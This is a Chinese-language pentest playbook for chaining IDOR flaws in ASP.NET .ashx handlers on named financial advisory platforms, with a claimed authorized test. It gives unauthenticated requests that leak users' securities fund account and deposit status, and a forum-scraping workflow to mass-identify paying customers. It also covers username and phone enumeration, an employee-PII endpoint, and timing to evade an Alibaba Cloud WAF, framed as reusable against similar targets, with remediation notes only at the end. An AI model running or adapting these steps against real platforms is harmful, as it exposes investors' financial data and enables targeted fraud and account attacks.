# .NET ashx 金融平台 IDOR 链手法

> 真源案例：stockhn.com / niuguwang.com（海能投顾/牛股王），2026-09-02 授权测试

## 背景

国内投顾/证券/金融平台大量使用 ASP.NET Web Forms 架构，接口以 `.ashx` 通用处理程序暴露。
这类系统的常见特征：
- 多子系统（用户中心/论坛/动态/交易）共享同一套自增整数 userid
- 早期 handler 缺少统一鉴权中间件，各 handler 独立校验（或不校验）
- 金融元数据（资金账号、开户状态、入金状态）直接附在用户信息接口中

## 杀伤链

### Phase 1: ashx 指纹识别

```
# 常见 ashx handler 命名模式
getuserinfo.ashx    # 用户资料
getfeeduser.ashx    # 动态/feed
checkUserName.ashx  # 用户名校验
login.ashx          # 登录
getVerifyCode.ashx  # 验证码
bbsgetforum.ashx    # 论坛帖子
bbsgetforumlist.ashx # 论坛板块

# IIS 服务器指纹
Server: Microsoft-IIS/10.0
X-Powered-By: ASP.NET
```

在 Wappalyzer / 响应头中确认 ASP.NET 后，立刻枚举常见 ashx handler 名。

### Phase 2: 无鉴权 IDOR 验证

```http
POST /api/getuserinfo.ashx HTTP/1.1
Host: user.目标.com
Content-Type: application/x-www-form-urlencoded;charset=UTF-8

userid=1
```

**判定标准**：
- 无 Cookie/Token/Session 直接发
- 返回 `result:1` + `userInfo` 含 userName → **IDOR 确认**
- 测试 userid=1,2,10,100,1000,10000,100000 确认连续性

**关键泄露字段**：
| 字段 | 含义 | 敏感度 |
|------|------|--------|
| userName | 真实姓名/昵称 | 高 |
| gender/genderView | 性别 | 中 |
| isSetPassword | 是否设密码 | 高(辅助撞库) |
| mobileStatus/mobileView | 手机绑定 | 高 |
| fundAccount.fundAccount | 证券资金账号 | 极高 |
| fundAccount.hasOrder | 是否付费客户 | 极高 |
| fundAccount.khAuditStatus | 开户审核状态 | 高 |
| fundAccount.depositStatus | 入金状态 | 高 |
| fundAccount.hasLevel2 | Level2 行情权限 | 中 |

### Phase 3: 多系统交叉收割

核心思路：**用公开系统（BBS/动态/评论）作为 userid oracle，避免全量盲扫**。

```
步骤:
1. GET /api/bbsgetforumlist.ashx → data[].id 获取板块 ID
2. GET /api/bbsgetforum.ashx?fid=X&index=N → data[].userID 收集发帖人
3. 遍历所有板块 × 多页 → 得到数千活跃 userid
4. 对每个 userid 调 getuserinfo.ashx 查 hasOrder
5. hasOrder==1 的就是付费客户
```

**论坛 API 字段映射**（实战踩坑）：
- 板块列表：响应 `data[]` 非 `forumList[]`，ID 字段 `id` 非 `fid`
- 帖子列表：响应 `data[]` 非 `postList[]`，分页 `dataTotalPage` 可达 200
- 动态列表：响应 `data[]` 非 `feedList[]`，含 `dynamicType`/`stockCode`/`stockName`

### Phase 4: 付费客户批量识别

```python
# 核心筛选逻辑
if fundAccount.get("hasOrder") == 1:
    # 付费客户确认
    # fundAccount.fundAccount = 证券资金账号
    # khAuditStatus = 5 → 已开户
    # depositStatus = 1 → 已入金
```

实测命中率：论坛活跃用户中约 10-28% 为付费客户。

### Phase 5: 补充接口

```
# 员工 PII
GET /api/Environment/GetEmployee → 全体投顾员工姓名+执业编号

# 用户名枚举
POST /api/checkUserName.ashx  username=admin → code=21(存在)/code=0(不存在)

# 手机号状态
POST /api_wap/ngw/login.ashx?packtype=1101  mobile+password
  code=-21 → 已注册未设密码
  code=51  → 已注册已设密码
  code=-12 → 未注册
```

## WAF 对抗

| 特征 | 值 |
|------|-----|
| WAF 类型 | 阿里云 WAF |
| 安全 QPS | ~5 (间隔 ≥ 0.2s) |
| 触发条件 | 同 IP 高频 POST |
| 封禁方式 | 405 + "your request has been blocked" |
| 封禁时长 | ~30 分钟自动解除 |
| 规避 | 0.3-0.5s 间隔 + 检测 blocked 自动暂停 |

## Flutter H5 WebView 特征

牛股王 APP (com.niuguwang.stock) 实测：
- APK: Flutter AOT + 原生 dex 仅第三方 SDK
- 业务逻辑: H5 WebView 加载 m.niuguwang.com / h5.niuguwang.com
- 订单端点不在 APK，需运行时抓包
- getuserinfo 返回的 `verifyUrl`(m.xxx.com/views/ucenter/...) 暗示 H5 入口

## 可复用场景

| 指纹 | 说明 |
|------|------|
| `.ashx` 后缀 | ASP.NET Web Forms 处理程序 |
| `userid=` 连续整数参数 | 无 UUID 混淆 |
| 多子域(user./bbs./api./dynamic.) | 共享用户体系 |
| `fundAccount`/`hasOrder` | 金融/证券/投顾平台 |
| `khAuditStatus`/`depositStatus` | 开户/入金状态 |
| 响应含 `userIcons`/`niuren`/`slogan` | 牛股王族系 |

## 修复建议（供报告）

1. **P0**: 所有 ashx handler 增加统一鉴权中间件，userid 与会话绑定
2. **P1**: fundAccount 等金融字段从非鉴权接口移除，或脱敏
3. **P1**: BBS/动态等公开接口去除 userID 明文，改用不可枚举标识
4. **P2**: 限频+图形验证码防止批量枚举
5. **P2**: 员工接口增加鉴权
